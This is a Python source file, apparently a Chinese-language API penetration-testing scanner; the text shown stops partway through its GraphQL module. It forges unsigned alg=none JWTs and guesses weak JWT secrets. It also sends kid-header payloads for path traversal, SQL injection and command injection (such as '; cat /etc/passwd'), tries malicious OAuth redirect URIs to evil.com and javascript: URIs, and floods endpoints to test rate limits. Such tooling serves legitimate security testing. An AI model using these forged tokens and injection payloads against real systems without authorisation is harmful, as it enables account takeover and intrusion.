#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
API安全扫描器 - RESTful API安全测试工具

功能模块：
1. REST API端点发现
2. JWT令牌分析（alg=none/密钥混淆/kid注入）
3. OAuth 2.0流程测试
4. API速率限制测试
5. GraphQL内省查询测试
6. 损坏的功能级授权（BFLA）测试
7. 批量赋值漏洞测试

使用方法：
    python api_security_scanner.py --help
    python api_security_scanner.py discover -u http://api.example.com
    python api_security_scanner.py jwt -t "eyJhbGciOi..."
    python api_security_scanner.py oauth -c http://api.example.com/oauth
    python api_security_scanner.py ratelimit -u http://api.example.com/endpoint
    python api_security_scanner.py graphql -u http://api.example.com/graphql
    python api_security_scanner.py bfla -u http://api.example.com --token "Bearer xxx"
    python api_security_scanner.py massassign -u http://api.example.com/users/1

免责声明：仅用于授权的安全测试，未经授权测试API属于违法行为。
"""

import os
import sys
import re
import json
import time
import base64
import hmac
import hashlib
import argparse
import requests
from urllib.parse import urljoin, urlparse, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import List, Dict, Optional, Any, Tuple

try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False


# ============================================================================
# 全局配置
# ============================================================================

class Config:
    """全局配置"""
    TIMEOUT = 15
    MAX_THREADS = 5
    USER_AGENT = "APISecurityScanner/1.0"
    # 常见API路径
    COMMON_API_PATHS = [
        '/api', '/api/v1', '/api/v2', '/api/v3',
        '/api/users', '/api/user', '/api/login', '/api/auth',
        '/api/register', '/api/logout', '/api/token', '/api/oauth',
        '/api/products', '/api/orders', '/api/items', '/api/cart',
        '/api/admin', '/api/admin/users', '/api/admin/settings',
        '/api/swagger', '/api/swagger-ui', '/api/swagger-ui.html',
        '/api/swagger.json', '/api/swagger.yaml',
        '/api/openapi', '/api/openapi.json', '/api/openapi.yaml',
        '/api/docs', '/api/redoc', '/api/health', '/api/status',
        '/api/version', '/api/info', '/api/config',
        '/api/graphql', '/api/graphiql',
        '/api/accounts', '/api/profile', '/api/settings',
        '/api/files', '/api/upload', '/api/download',
        '/api/messages', '/api/notifications',
        '/api/search', '/api/query',
        '/v1', '/v2', '/v3',
        '/rest', '/rest/v1', '/rest/api',
    ]
    # 常见API文档路径
    SWAGGER_PATHS = [
        '/swagger', '/swagger/', '/swagger-ui', '/swagger-ui/',
        '/swagger-ui.html', '/swagger-resources',
        '/swagger.json', '/swagger.yaml', '/swagger.yml',
        '/openapi.json', '/openapi.yaml', '/openapi.yml',
        '/api-docs', '/api/docs', '/docs',
        '/v1/swagger.json', '/v2/swagger.json',
        '/api/swagger.json', '/api/swagger.yaml',
        '/redoc', '/redoc/', '/api/redoc',
    ]


class Colors:
    """终端颜色"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'


def log_info(msg):
    print(f"{Colors.BLUE}[信息]{Colors.END} {msg}")

def log_success(msg):
    print(f"{Colors.GREEN}[成功]{Colors.END} {msg}")

def log_warn(msg):
    print(f"{Colors.YELLOW}[警告]{Colors.END} {msg}")

def log_vuln(msg):
    print(f"{Colors.RED + Colors.BOLD}[漏洞]{Colors.END} {msg}")

def log_error(msg):
    print(f"{Colors.RED}[错误]{Colors.END} {msg}")


# ============================================================================
# 模块1：REST API端点发现
# ============================================================================

class APIEndpointDiscovery:
    """
    REST API端点发现工具

    通过多种方式发现API端点：
    - 常见路径枚举
    - Swagger/OpenAPI文档解析
    - JavaScript文件分析
    - 响应头信息提取
    """

    def __init__(self, base_url: str, **kwargs):
        """
        初始化API端点发现工具

        Args:
            base_url: 基础URL
            kwargs: 额外配置
        """
        self.base_url = base_url.rstrip('/')
        self.timeout = kwargs.get('timeout', Config.TIMEOUT)
        self.headers = kwargs.get('headers', {})
        self.cookies = kwargs.get('cookies', {})
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': Config.USER_AGENT, 'Accept': 'application/json, */*'})
        self.discovered_endpoints = []
        self.discovered_docs = []

    def discover_from_swagger(self) -> List[Dict]:
        """
        从Swagger/OpenAPI文档发现端点

        Returns:
            发现的端点列表
        """
        log_info("从Swagger/OpenAPI文档发现端点...")
        endpoints = []

        for path in Config.SWAGGER_PATHS:
            url = urljoin(self.base_url, path)
            try:
                response = self.session.get(url, timeout=self.timeout,
                                            cookies=self.cookies, headers=self.headers,
                                            verify=False)
                if response.status_code == 200:
                    content_type = response.headers.get('Content-Type', '')

                    if 'json' in content_type or response.text.startswith('{'):
                        try:
                            spec = response.json()
                            endpoints = self._parse_openapi_spec(spec, url)
                            if endpoints:
                                self.discovered_docs.append({
                                    'url': url,
                                    'type': 'OpenAPI/Swagger',
                                    'version': spec.get('swagger', spec.get('openapi', '未知')),
                                })
                                log_success(f"发现API文档: {url}")
                                for ep in endpoints:
                                    log_success(f"  端点: {ep['method']} {ep['path']}")
                                break
                        except json.JSONDecodeError:
                            continue

                    elif YAML_AVAILABLE and ('yaml' in content_type or response.text.startswith('---')):
                        try:
                            spec = yaml.safe_load(response.text)
                            endpoints = self._parse_openapi_spec(spec, url)
                            if endpoints:
                                self.discovered_docs.append({
                                    'url': url,
                                    'type': 'OpenAPI/Swagger (YAML)',
                                    'version': spec.get('swagger', spec.get('openapi', '未知')),
                                })
                                break
                        except Exception:
                            continue
            except requests.RequestException:
                continue

        self.discovered_endpoints.extend(endpoints)
        return endpoints

    def _parse_openapi_spec(self, spec: Dict, source_url: str) -> List[Dict]:
        """
        解析OpenAPI规范

        Args:
            spec: OpenAPI规范字典
            source_url: 文档来源URL

        Returns:
            端点列表
        """
        endpoints = []
        paths = spec.get('paths', {})

        for path, methods in paths.items():
            for method, details in methods.items():
                if method.upper() in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']:
                    endpoint = {
                        'path': path,
                        'method': method.upper(),
                        'summary': details.get('summary', ''),
                        'description': details.get('description', ''),
                        'parameters': details.get('parameters', []),
                        'auth_required': 'security' in details or 'security' in spec,
                        'source': source_url,
                    }
                    endpoints.append(endpoint)

        return endpoints

    def discover_from_paths(self) -> List[Dict]:
        """
        通过常见路径枚举发现端点

        Returns:
            发现的端点列表
        """
        log_info("通过路径枚举发现API端点...")
        endpoints = []

        for path in Config.COMMON_API_PATHS:
            url = urljoin(self.base_url, path)
            try:
                response = self.session.get(url, timeout=self.timeout,
                                            cookies=self.cookies, headers=self.headers,
                                            verify=False)

                # 检查是否是有效的API端点
                if response.status_code in [200, 201, 401, 403]:
                    content_type = response.headers.get('Content-Type', '')

                    if 'json' in content_type:
                        endpoint = {
                            'path': path,
                            'method': 'GET',
                            'status_code': response.status_code,
                            'content_type': content_type,
                            'response_size': len(response.content),
                            'source': '路径枚举',
                        }
                        endpoints.append(endpoint)

                        if response.status_code == 200:
                            log_success(f"发现端点: GET {path} [{response.status_code}]")
                        elif response.status_code in [401, 403]:
                            log_warn(f"需要认证: GET {path} [{response.status_code}]")

            except requests.RequestException:
                continue

        self.discovered_endpoints.extend(endpoints)
        return endpoints

    def discover_from_js(self) -> List[Dict]:
        """
        从JavaScript文件中发现API端点

        通过分析页面引用的JS文件，提取API调用。

        Returns:
            发现的端点列表
        """
        log_info("从JavaScript文件发现API端点...")
        endpoints = []

        try:
            response = self.session.get(self.base_url, timeout=self.timeout, verify=False)
            page_content = response.text

            # 提取JS文件引用
            js_pattern = re.compile(r'src=["\']([^"\']+\.js)["\']', re.IGNORECASE)
            js_files = js_pattern.findall(page_content)

            # 提取内联API调用
            api_pattern = re.compile(
                r'(?:fetch|axios|XMLHttpRequest|\$\.(?:get|post|put|delete|ajax))\s*\('
                r'["\']([^"\']+)["\']', re.IGNORECASE
            )
            inline_apis = api_pattern.findall(page_content)

            for api_path in inline_apis:
                if api_path.startswith('http') or api_path.startswith('/'):
                    endpoint = {
                        'path': api_path,
                        'method': '未知',
                        'source': '内联JavaScript',
                    }
                    endpoints.append(endpoint)
                    log_success(f"JS中发现API: {api_path}")

            # 分析外部JS文件
            for js_file in js_files:
                js_url = urljoin(self.base_url, js_file)
                try:
                    js_response = self.session.get(js_url, timeout=self.timeout, verify=False)
                    if js_response.status_code == 200:
                        api_calls = api_pattern.findall(js_response.text)
                        for api_path in api_calls:
                            if api_path.startswith('http') or api_path.startswith('/'):
                                endpoint = {
                                    'path': api_path,
                                    'method': '未知',
                                    'source': js_file,
                                }
                                endpoints.append(endpoint)
                                log_success(f"外部JS中发现API: {api_path} (来源: {js_file})")
                except requests.RequestException:
                    continue

        except requests.RequestException as e:
            log_error(f"获取页面失败: {e}")

        self.discovered_endpoints.extend(endpoints)
        return endpoints

    def discover_all(self) -> Dict:
        """
        执行全面的端点发现

        Returns:
            发现结果字典
        """
        log_info(f"开始API端点发现: {self.base_url}")

        self.discover_from_swagger()
        self.discover_from_paths()
        self.discover_from_js()

        # 去重
        unique_endpoints = {}
        for ep in self.discovered_endpoints:
            key = f"{ep.get('method', 'GET')}:{ep.get('path', '')}"
            if key not in unique_endpoints:
                unique_endpoints[key] = ep

        result = {
            'base_url': self.base_url,
            'docs_found': self.discovered_docs,
            'endpoints_found': len(unique_endpoints),
            'endpoints': list(unique_endpoints.values()),
            'timestamp': datetime.now().isoformat(),
        }

        return result


# ============================================================================
# 模块2：JWT令牌分析
# ============================================================================

class JWTAnalyzer:
    """
    JWT（JSON Web Token）安全分析器

    检测以下JWT安全问题：
    - alg=none 攻击（无签名验证）
    - RS/HS 密钥混淆攻击
    - kid 注入攻击
    - 敏感信息泄露
    - 弱密钥检测
    """

    # 常见弱密钥
    WEAK_KEYS = [
        'secret', 'password', 'key', 'jwt', 'token', '123456',
        'admin', 'test', 'example', 'default', 'none',
        'your-256-bit-secret', 'supersecret', 'changeme',
        'jwtsecret', 'jwt-secret', 'mykey', 'private',
    ]

    def __init__(self, token: str = None, **kwargs):
        """
        初始化JWT分析器

        Args:
            token: JWT令牌
            kwargs: 额外配置
        """
        self.token = token
        self.url = kwargs.get('url')
        self.timeout = kwargs.get('timeout', Config.TIMEOUT)
        self.session = requests.Session()
        self.headers = kwargs.get('headers', {})
        self.cookies = kwargs.get('cookies', {})

    @staticmethod
    def decode_jwt(token: str) -> Tuple[Dict, Dict, str]:
        """
        解码JWT令牌（不验证签名）

        Args:
            token: JWT令牌

        Returns:
            (header, payload, signature) 元组
        """
        parts = token.split('.')
        if len(parts) < 2:
            raise ValueError("无效的JWT格式")

        # 解码header
        header_b64 = parts[0]
        header_b64 += '=' * (4 - len(header_b64) % 4)
        header = json.loads(base64.urlsafe_b64decode(header_b64))

        # 解码payload
        payload_b64 = parts[1]
        payload_b64 += '=' * (4 - len(payload_b64) % 4)
        payload = json.loads(base64.urlsafe_b64decode(payload_b64))

        # 签名
        signature = parts[2] if len(parts) > 2 else ''

        return header, payload, signature

    def analyze_alg_none(self) -> Dict:
        """
        检测alg=none漏洞

        尝试将JWT的算法设置为none，移除签名，检查服务端是否接受。

        Returns:
            检测结果
        """
        log_info("检测 alg=none 漏洞...")
        result = {
            'vulnerability': 'alg=none',
            'vulnerable': False,
            'details': '',
        }

        if not self.token:
            return result

        try:
            header, payload, _ = self.decode_jwt(self.token)
        except Exception as e:
            result['details'] = f"JWT解码失败: {e}"
            return result

        # 构造alg=none的JWT
        attacks = [
            # alg: none, 无签名
            {'alg': 'none', 'typ': 'JWT'},
            # alg: None
            {'alg': 'None', 'typ': 'JWT'},
            # alg: NONE
            {'alg': 'NONE', 'typ': 'JWT'},
            # alg: nOnE
            {'alg': 'nOnE', 'typ': 'JWT'},
        ]

        for attack_header in attacks:
            # 编码header
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(attack_header).encode()
            ).rstrip(b'=').decode()

            # 编码payload
            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).rstrip(b'=').decode()

            # 构造无签名JWT
            none_token = f"{header_b64}.{payload_b64}."

            if self.url:
                # 发送到服务端验证
                test_headers = self.headers.copy()
                test_headers['Authorization'] = f'Bearer {none_token}'

                try:
                    response = self.session.get(
                        self.url, headers=test_headers,
                        timeout=self.timeout, cookies=self.cookies,
                        verify=False
                    )

                    if response.status_code == 200:
                        result['vulnerable'] = True
                        result['details'] = f"服务端接受 alg={attack_header['alg']} 的令牌"
                        result['forged_token'] = none_token
                        log_vuln(f"发现 alg=none 漏洞! 服务端接受无签名令牌")
                        return result
                except requests.RequestException:
                    continue

        if not self.url:
            result['details'] = "未提供验证URL，仅生成测试令牌"
            result['forged_token'] = none_token if 'none_token' in locals() else None

        return result

    def analyze_key_confusion(self) -> Dict:
        """
        检测RS/HS密钥混淆漏洞

        如果服务端使用RS256（非对称），尝试用公钥作为HMAC密钥进行HS256签名。

        Returns:
            检测结果
        """
        log_info("检测密钥混淆漏洞...")
        result = {
            'vulnerability': 'RS/HS密钥混淆',
            'vulnerable': False,
            'details': '',
        }

        if not self.token:
            return result

        try:
            header, payload, _ = self.decode_jwt(self.token)
        except Exception as e:
            result['details'] = f"JWT解码失败: {e}"
            return result

        current_alg = header.get('alg', '')

        # 仅当当前算法是RS256时尝试
        if current_alg in ['RS256', 'RS384', 'RS512']:
            # 需要公钥才能进行此攻击
            # 这里提供攻击框架，实际需要获取公钥
            result['details'] = (
                f"当前算法为 {current_alg}（非对称），"
                "若能获取公钥，可尝试用公钥作为HMAC密钥进行HS256签名。"
                "请提供公钥文件路径进行完整测试。"
            )
            result['current_alg'] = current_alg
            result['attack_method'] = '使用公钥作为HS256密钥签名'
        elif current_alg in ['HS256', 'HS384', 'HS512']:
            result['details'] = f"当前算法已为HMAC ({current_alg})，密钥混淆攻击不适用"
        else:
            result['details'] = f"当前算法: {current_alg}"

        return result

    def analyze_kid_injection(self) -> Dict:
        """
        检测kid头部注入漏洞

        kid（Key ID）用于指定验证签名时使用的密钥。
        可能的注入方式：路径遍历、SQL注入、命令注入。

        Returns:
            检测结果
        """
        log_info("检测kid注入漏洞...")
        result = {
            'vulnerability': 'kid注入',
            'vulnerable': False,
            'details': '',
            'tests': [],
        }

        if not self.token:
            return result

        try:
            header, payload, _ = self.decode_jwt(self.token)
        except Exception as e:
            result['details'] = f"JWT解码失败: {e}"
            return result

        # 检查是否使用kid
        if 'kid' not in header:
            result['details'] = "JWT header中未使用kid字段"
            return result

        original_kid = header['kid']
        result['original_kid'] = original_kid

        # kid注入测试payload
        kid_payloads = [
            # 路径遍历 - 引用一个已知文件作为密钥
            '../../../../dev/null',
            '../../../../etc/passwd',
            '../../../../proc/self/environ',
            # SQL注入
            "' OR '1'='1",
            "' UNION SELECT 'secret' --",
            # 命令注入
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '$(cat /etc/passwd)',
            # 空字节
            'key\x00../../etc/passwd',
        ]

        for kid_payload in kid_payloads:
            attack_header = header.copy()
            attack_header['kid'] = kid_payload

            test_result = {
                'kid_payload': kid_payload,
                'header': attack_header,
            }

            # 编码修改后的header
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(attack_header).encode()
            ).rstrip(b'=').decode()

            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).rstrip(b'=').decode()

            # 使用空签名（如果kid注入导致密钥为空文件）
            forged_token = f"{header_b64}.{payload_b64}."

            if self.url:
                test_headers = self.headers.copy()
                test_headers['Authorization'] = f'Bearer {forged_token}'
                try:
                    response = self.session.get(
                        self.url, headers=test_headers,
                        timeout=self.timeout, cookies=self.cookies,
                        verify=False
                    )
                    test_result['status_code'] = response.status_code
                    if response.status_code == 200:
                        result['vulnerable'] = True
                        result['details'] = f"kid注入成功! Payload: {kid_payload}"
                        log_vuln(f"发现kid注入漏洞! Payload: {kid_payload}")
                        break
                except requests.RequestException:
                    test_result['status_code'] = '请求失败'

            result['tests'].append(test_result)

        if not result['vulnerable'] and not result['details']:
            result['details'] = "kid注入测试完成，未发现漏洞"

        return result

    def analyze_weak_key(self) -> Dict:
        """
        检测弱密钥

        尝试用常见弱密钥验证HS256签名。

        Returns:
            检测结果
        """
        log_info("检测弱密钥...")
        result = {
            'vulnerability': '弱密钥',
            'vulnerable': False,
            'weak_key': None,
            'details': '',
        }

        if not self.token:
            return result

        try:
            header, payload, signature = self.decode_jwt(self.token)
        except Exception as e:
            result['details'] = f"JWT解码失败: {e}"
            return result

        if header.get('alg') not in ['HS256', 'HS384', 'HS512']:
            result['details'] = f"当前算法 {header.get('alg')} 不是HMAC，弱密钥检测不适用"
            return result

        # 获取签名输入
        signing_input = f"{self.token.split('.')[0]}.{self.token.split('.')[1]}"

        # 尝试每个弱密钥
        for key in self.WEAK_KEYS:
            try:
                computed_sig = base64.urlsafe_b64encode(
                    hmac.new(key.encode(), signing_input.encode(), hashlib.sha256).digest()
                ).rstrip(b'=').decode()

                if computed_sig == signature:
                    result['vulnerable'] = True
                    result['weak_key'] = key
                    result['details'] = f"发现弱密钥: '{key}'"
                    log_vuln(f"发现弱密钥: '{key}'")
                    return result
            except Exception:
                continue

        result['details'] = "弱密钥检测完成，未发现弱密钥"
        return result

    def analyze_info_disclosure(self) -> Dict:
        """
        检测JWT中的敏感信息泄露

        Returns:
            检测结果
        """
        log_info("检测JWT中的敏感信息泄露...")
        result = {
            'vulnerability': '敏感信息泄露',
            'vulnerable': False,
            'findings': [],
            'details': '',
        }

        if not self.token:
            return result

        try:
            header, payload, _ = self.decode_jwt(self.token)
        except Exception as e:
            result['details'] = f"JWT解码失败: {e}"
            return result

        # 敏感字段
        sensitive_keys = ['password', 'passwd', 'pwd', 'secret', 'key',
                         'token', 'ssn', 'credit', 'card', 'cvv',
                         'email', 'phone', 'address', 'api_key',
                         'private', 'credential', 'auth']

        for key, value in payload.items():
            key_lower = key.lower()
            for sensitive in sensitive_keys:
                if sensitive in key_lower:
                    result['vulnerable'] = True
                    result['findings'].append({
                        'field': key,
                        'value': str(value)[:50],
                        'reason': f"字段名包含敏感词: '{sensitive}'",
                    })
                    log_warn(f"JWT payload中包含敏感字段: {key}")

        # 检查是否包含过多用户信息
        if len(payload) > 10:
            result['vulnerable'] = True
            result['findings'].append({
                'field': '多个字段',
                'reason': f"Payload包含 {len(payload)} 个字段，可能泄露过多信息",
            })

        # 检查是否包含过期时间
        if 'exp' not in payload:
            result['vulnerable'] = True
            result['findings'].append({
                'field': 'exp',
                'reason': '缺少过期时间(exp)字段，令牌可能永久有效',
            })
            log_warn("JWT缺少exp（过期时间）字段")

        if not result['findings']:
            result['details'] = "未发现敏感信息泄露"

        return result

    def analyze_all(self) -> Dict:
        """
        执行全面的JWT安全分析

        Returns:
            分析结果
        """
        log_info(f"开始JWT安全分析...")

        # 先解码显示JWT内容
        try:
            header, payload, signature = self.decode_jwt(self.token)
            print(f"\n  Header:  {json.dumps(header, indent=2)}")
            print(f"  Payload: {json.dumps(payload, indent=2)}")
            print(f"  Signature: {signature[:30]}...\n")
        except Exception as e:
            log_error(f"JWT解码失败: {e}")
            return {'error': str(e)}

        results = {
            'token': self.token[:50] + '...',
            'header': header,
            'payload': payload,
            'analyses': [
                self.analyze_alg_none(),
                self.analyze_key_confusion(),
                self.analyze_kid_injection(),
                self.analyze_weak_key(),
                self.analyze_info_disclosure(),
            ],
            'timestamp': datetime.now().isoformat(),
        }

        # 汇总
        vuln_count = sum(1 for a in results['analyses'] if a.get('vulnerable'))
        results['vulnerabilities_found'] = vuln_count

        return results


# ============================================================================
# 模块3：OAuth 2.0流程测试
# ============================================================================

class OAuthTester:
    """
    OAuth 2.0安全测试工具

    检测以下OAuth安全问题：
    - 授权码注入（authorization code injection）
    - 重定向URI验证不足
    - state参数缺失/可预测
    - PKCE缺失
    - 隐式流程滥用
    - 令牌泄露
    """

    def __init__(self, auth_server_url: str, **kwargs):
        """
        初始化OAuth测试器

        Args:
            auth_server_url: 授权服务器URL
            kwargs: 额外配置
        """
        self.auth_url = auth_server_url.rstrip('/')
        self.client_id = kwargs.get('client_id', 'test_client')
        self.redirect_uri = kwargs.get('redirect_uri', 'https://example.com/callback')
        self.timeout = kwargs.get('timeout', Config.TIMEOUT)
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': Config.USER_AGENT})

    def test_redirect_uri_validation(self) -> Dict:
        """
        测试重定向URI验证

        尝试使用各种恶意的redirect_uri来检测验证是否严格。

        Returns:
            测试结果
        """
        log_info("测试重定向URI验证...")
        result = {
            'test': '重定向URI验证',
            'vulnerable': False,
            'findings': [],
        }

        # 恶意redirect_uri测试
        malicious_uris = [
            # 开放重定向
            f'{self.redirect_uri}/../../../admin',
            f'{self.redirect_uri}?redirect=https://evil.com',
            # 路径遍历
            f'{self.redirect_uri}/../../',
            # 不同协议
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            # 子域名
            'https://evil.example.com/callback',
            # 路径前缀混淆
            f'https://evil.com{self.redirect_uri}',
            f'{self.redirect_uri}.evil.com',
            # 片段注入
            f'{self.redirect_uri}#access_token=evil',
            # 端口变化
            f'{self.redirect_uri.replace("https://", "http://")}',
        ]

        authorize_url = f"{self.auth_url}/authorize"

        for uri in malicious_uris:
            params = {
                'response_type': 'code',
                'client_id': self.client_id,
                'redirect_uri': uri,
            }
            try:
                response = self.session.get(
                    authorize_url, params=params,
                    timeout=self.timeout, allow_redirects=False, verify=False
                )

                # 检查是否被重定向到恶意URI
                if response.status_code in [302, 301]:
                    location = response.headers.get('Location', '')
                    if location and ('evil.com' in location or 'javascript:' in location
                                     or 'data:' in location):
                        result['vulnerable'] = True
                        result['findings'].append({
                            'redirect_uri': uri,
                            'server_redirect': location,
                            'issue': '服务端接受了恶意redirect_uri',
                        })
                        log_vuln(f"重定向URI验证不足! 恶意URI: {uri}")
            except requests.RequestException:
                continue

        if not result['vulnerable']:
            result['findings'].append({'message': '重定向URI验证通过'})
            log_info("重定向URI验证测试完成，未发现漏洞")

        return result

    def test_state_parameter(self) -> Dict:
        """
        测试state参数（CSRF防护）

        检查授权请求是否要求state参数，以及state是否可预测。

        Returns:
            测试结果
        """
        log_info("测试state参数...")
        result = {
            'test': 'state参数（CSRF防护）',
            'vulnerable': False,
            'findings': [],
        }

        authorize_url = f"{self.auth_url}/authorize"

        # 测试1：不带state参数
        params = {
            'response_type': 'code',
            'client_id': self.client_id,
            'redirect_uri': self.redirect_uri,
            # 不带state
        }
        try:
            response = self.session.get(
                authorize_url, params=params,
                timeout=self.timeout, allow_redirects=False, verify=False
            )
            if response.status_code in [302, 301, 200]:
                result['vulnerable'] = True
                result['findings'].append({
                    'issue': '允许不带state参数的授权请求',
                    'severity': '中危',
                })
                log_warn("允许不带state参数的授权请求")
        except requests.RequestException:
            pass

        # 测试2：发送多个请求检查state是否可预测
        states = []
        for i in range(3):
            params_with_state = {
                'response_type': 'code',
                'client_id': self.client_id,
                'redirect_uri': self.redirect_uri,
                'state': f'test_state_{i}',
            }
            try:
                response = self.session.get(
                    authorize_url, params=params_with_state,
                    timeout=self.timeout, allow_redirects=False, verify=False
                )
                if response.status_code in [302, 301]:
                    location = response.headers.get('Location', '')
                    if 'state' in location:
                        # 检查state是否原样返回
                        if f'state=test_state_{i}' in location:
                            states.append(f'test_state_{i}')
            except requests.RequestException:
                continue

        if len(states) >= 3:
            result['findings'].append({
                'message': 'state参数被正确回传',
            })

        return result

    def test_pkce(self) -> Dict:
        """
        测试PKCE（Proof Key for Code Exchange）支持

        检查授权服务器是否支持/要求PKCE。

        Returns:
            测试结果
        """
        log_info("测试PKCE支持...")
        result = {
            'test': 'PKCE支持',
            'vulnerable': False,
            'findings': [],
        }

        authorize_url = f"{self.auth_url}/authorize"

        # 发送带PKCE参数的请求
        params = {
            'response_type': 'code',
            'client_id': self.client_id,
            'redirect_uri': self.redirect_uri,
            'state': 'test_state',
            'code_challenge': 'E9Melhoa2OwvFrEMTJguCHaoeK1KkPpe4v5gQ3F5Bck',
            'code_challenge_method': 'S256',
        }

        try:
            response = self.session.get(
                authorize_url, params=params,
                timeout=self.timeout, allow_redirects=False, verify=False
            )

            if response.status_code in [302, 200]:
                result['findings'].append({'message': '服务端接受PKCE参数'})
            elif response.status_code == 400:
                result['vulnerable'] = True
                result['findings'].append({
                    'issue': '服务端不支持PKCE',
                    'severity': '中危',
                })
                log_warn("服务端不支持PKCE")
        except requests.RequestException:
            pass

        # 测试不带PKCE是否被接受
        params_no_pkce = {
            'response_type': 'code',
            'client_id': self.client_id,
            'redirect_uri': self.redirect_uri,
        }
        try:
            response = self.session.get(
                authorize_url, params=params_no_pkce,
                timeout=self.timeout, allow_redirects=False, verify=False
            )
            if response.status_code in [302, 200]:
                result['vulnerable'] = True
                result['findings'].append({
                    'issue': '允许不带PKCE的授权请求',
                    'severity': '低危',
                })
        except requests.RequestException:
            pass

        return result

    def test_all(self) -> Dict:
        """执行全面的OAuth安全测试"""
        log_info(f"开始OAuth安全测试: {self.auth_url}")

        results = {
            'auth_server': self.auth_url,
            'client_id': self.client_id,
            'tests': [
                self.test_redirect_uri_validation(),
                self.test_state_parameter(),
                self.test_pkce(),
            ],
            'timestamp': datetime.now().isoformat(),
        }

        vuln_count = sum(1 for t in results['tests'] if t.get('vulnerable'))
        results['vulnerabilities_found'] = vuln_count

        return results


# ============================================================================
# 模块4：API速率限制测试
# ============================================================================

class RateLimitTester:
    """
    API速率限制测试工具

    通过快速发送大量请求来检测API是否有速率限制。
    """

    def __init__(self, url: str, **kwargs):
        """
        初始化速率限制测试器

        Args:
            url: API端点URL
            kwargs: 额外配置
        """
        self.url = url
        self.max_requests = kwargs.get('max_requests', 100)
        self.threads = kwargs.get('threads', Config.MAX_THREADS)
        self.timeout = kwargs.get('timeout', Config.TIMEOUT)
        self.headers = kwargs.get('headers', {})
        self.method = kwargs.get('method', 'GET')
        self.data = kwargs.get('data')
        self.session = requests.Session()
        self.response_times = []
        self.status_codes = []

    def test_rate_limit(self) -> Dict:
        """
        执行速率限制测试

        发送大量并发请求，观察是否有限流措施。

        Returns:
            测试结果
        """
        log_info(f"开始速率限制测试: {self.url}")
        log_info(f"请求数: {self.max_requests}, 线程数: {self.threads}")

        def send_request(idx):
            try:
                start_time = time.time()
                if self.method.upper() == 'GET':
                    response = self.session.get(
                        self.url, timeout=self.timeout,
                        headers=self.headers, verify=False
                    )
                else:
                    response = self.session.post(
                        self.url, json=self.data, timeout=self.timeout,
                        headers=self.headers, verify=False
                    )
                elapsed = time.time() - start_time
                return (response.status_code, elapsed)
            except requests.RequestException:
                return (None, 0)

        results = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(send_request, i) for i in range(self.max_requests)]
            for future in as_completed(futures):
                results.append(future.result())

        # 分析结果
        for status, elapsed in results:
            if status:
                self.status_codes.append(status)
                self.response_times.append(elapsed)

        # 统计状态码分布
        from collections import Counter
        status_distribution = Counter(self.status_codes)

        # 检测是否触发限流
        rate_limited = 429 in status_distribution or 503 in status_distribution

        # 平均响应时间
        avg_time = sum(self.response_times) / len(self.response_times) if self.response_times else 0

        result = {
            'url': self.url,
            'total_requests': self.max_requests,
            'successful_requests': len(self.response_times),
            'rate_limited': rate_limited,
            'status_distribution': dict(status_distribution),
            'avg_response_time': f"{avg_time:.3f}s",
            'recommendation': '',
            'timestamp': datetime.now().isoformat(),
        }

        if rate_limited:
            result['recommendation'] = 'API已有速率限制，429/503状态码出现'
            log_success("检测到速率限制机制（429/503状态码）")
        else:
            result['recommendation'] = 'API可能缺少速率限制，建议实施限流策略'
            log_vuln("API可能缺少速率限制!")

        return result


# ============================================================================
# 模块5：GraphQL内省查询测试
# ============================================================================

class GraphQLTester:
    """
    GraphQL安全测试工具

    检测以下GraphQL安全问题：
    - 内省查询（Introspection）
    - 查询深度限制
    - 批量查询攻击
    - 字段建议（Field Suggestion）
    - 变更操作授权
    """

    # 内省查询
    INTROSPECTION_QUERY = """
    query IntrospectionQuery {
        __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
                ...FullType
            }
            directives {
                name
                description
                locations
                args {
                    ...InputValue
                }
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type { ...TypeRef }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                                    name
                    ofType {
                        kind
                        name
                        ofType {
                            kind
                            name
                            ofType {
                                kind
                                name
                                ofType {
                                    kind
                                    name
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    """

    def __init__(self, url: str, **kwargs):
        """
        初始化GraphQL测试器

        Args:
            url: GraphQL端点URL
            kwargs: 额外配置
        """
        self.url = url
        self.timeout = kwargs.get('timeout', Config.TIMEOUT)
        self.headers = kwargs.get('headers', {})
        self.headers.update({'Content-Type': 'application/json'})
        self.session = requests.Session()

    def test_introspection(self) -> Dict:
        """
        测试内省查询是否启用

        Returns:
            测试结果
        """
        log_info("测试GraphQL内省查询...")
        result = {
            'test': '内省查询',
            'vulnerable': False,
            'schema': None,
            'details': '',
        }

        payload = json.dumps({'query': self.INTROSPECTION_QUERY})

        try:
            response = self.session.post(
                self.url, data=payload, timeout=self.timeout,
                headers=self.headers, verify=False
            )

            if response.status_code == 200:
                data = response.json()
                if 'data' in data and '__schema' in data.get('data', {}):
                    result['vulnerable'] = True
                    schema = data['data']['__schema']
                    result['schema'] = {
                        'query_type': schema.get('queryType', {}).get('name', '未知'),
